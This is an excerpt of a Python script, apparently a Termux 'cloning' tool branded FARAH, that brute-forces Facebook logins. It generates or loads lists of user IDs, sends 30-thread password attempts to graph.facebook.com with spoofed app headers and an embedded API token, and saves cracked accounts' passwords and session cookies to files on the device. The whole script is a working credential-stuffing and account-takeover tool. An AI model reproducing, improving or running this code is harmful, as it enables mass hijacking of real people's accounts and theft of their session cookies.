...
logo=(f"""\033[1;37m
     ...
     d88888b  .d8b.  d8888b.  .d8b.  db   db 
     88'     d8' `8b 88  `8D d8' `8b 88   88 
     88ooo   88ooo88 88oobY' 88ooo88 88ooo88 
     88~~~   88~~~88 88`8b   88~~~88 88~~~88 
     88      88   88 88 `88. 88   88 88   88 
     YP      YP   YP 88   YD YP   YP YP   YP 
                                                                                         
════════════════════════════════════════════════
  [×] \033[1;37m Tool Owner :-  FARAH ZADA
  [×] \033[1;37m Facebook   :-  FARAH ZADA
  [×] \033[1;37m GitHub     :-  nhe hay 😂
...
def Main_FARAH():
        ...
        if opt1 == "1": method()
            ...
            clear();print(' [\033[1;32m1\033[97;1m] Pakistan Random Cloning');print(' [\033[1;32m0\033[97;1m] \033[1;31mBack Main Menu');line()
            opt = input(' [•] Choose : ')
            if opt == '1':pak()
            else:line();print('\033[1;33m [•]\033[1;31m Selected Wrong Option ');time.sleep(2);Main_FARAH()
            ...
            d=input(' [•] Choose : ')
            #if d == '1':os.system('');Main_FARAH()
            if d == '2':os.system('xdg-open https://www.facebook.com/profile.php?id=100027811627170&mibextid=ZbWKwL');Main_FARAH()
...
def method():
    clear();print("\033[1;32m [•]\033[1;37m For Example : \033[1;32m/sdcard/FARAH.txt");line()
    ...
    with tred(max_workers=30) as FARAH:
        clear()
        tl = str(len(fo))
        ...
        print("\033[1;37m[×] Use Flight Mode For Speed UP");print('\033[1;33m[×] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/FARAH');line()
        #line()
        for user in fo:
            ids,names = user.split('|')
            passlist = plist
            if methd =='1':
                FARAH.submit(api1,ids,names,passlist)
            #elif methd =='2':
                #FARAH.submit(api1,ids,names,passlist)
    ...
    p(" \033[1;32m[•] \033[1;37mCloning Accounts Saved in\033[1;32m /sdcard/FARAH")
...
def pak():
                ...
                with tred(max_workers=30) as FARAH:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;37m[×] Total IDs   :\033[1;32m '+tl);print('\033[1;37m[×] Chose Code  : %s'%(code));print("\033[1;37m[×] Use Flight Mode For Speed UP");print('\033[1;33m[×] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/FARAH');line()
                        for psx in user:
                                ids = code+psx
                                ...
                                FARAH.submit(rd1,ids,passlist)
                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/FARAH/FARAH-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/FARAH/FARAH-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python FARAH.py')
...
def afg():
                ...
                with tred(max_workers=30) as FARAH:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+tl);print('\033[1;32m (√) \033[1;37mChose Code  : %s'%(code));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/FARAH');line()
                        for psx in user:
...
def gmail():
                ...
                with tred(max_workers=30) as FARAH:
                        ...
                        clear()
                        print('\033[1;37m[×] Total IDs   :\033[1;32m '+total);print('\033[1;37mChosed Gmail  : %s'%(domain));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/FARAH');line()
                        for user in fo:
                                ids,names = user.split('|')
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write('\r\r\33[1;37m [FARAH] %s | \033[1;32mOK:-%s  \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        print('\r\r\033[1;32m [FARAH-OK] '+uid+' √ '+pas)
                        #print(' \33[1;33m[Cookies] == '+cookie)
                        file_path_ok = os.path.join(folder_path, 'FARAH-R-OK.txt')
                        file_path_cookies = os.path.join(folder_path, 'FARAH-R-COOKIE.txt')
                        ...
                        file_path = os.path.join(folder_path, 'FARAH-R-CP.txt')
...
def api1(ids,names,passlist):
    try:
        ...
        for pw in passlist:
            ...
            ua = "[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.3312501,width=800,height=1280};FBLC/es_ES;FBCR/Jazz;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A042F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
            head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            ...
            if 'session_key' in po:
                    ...
                    file_path = os.path.join(folder_path, 'FARAH-FILE-OK.txt')
                    ...
                    open('/sdcard/FARAH/FARAH-FILE-OK-COOKIE.txt','a').write(uid+' √ '+pas+' >>> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' √ '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r\r\33[1m\33[1;35m [FARAH-CP] '+uid+' | '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'FARAH-FILE-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' √ '+pas+'\n')
                    cps.append(uid)
                    break
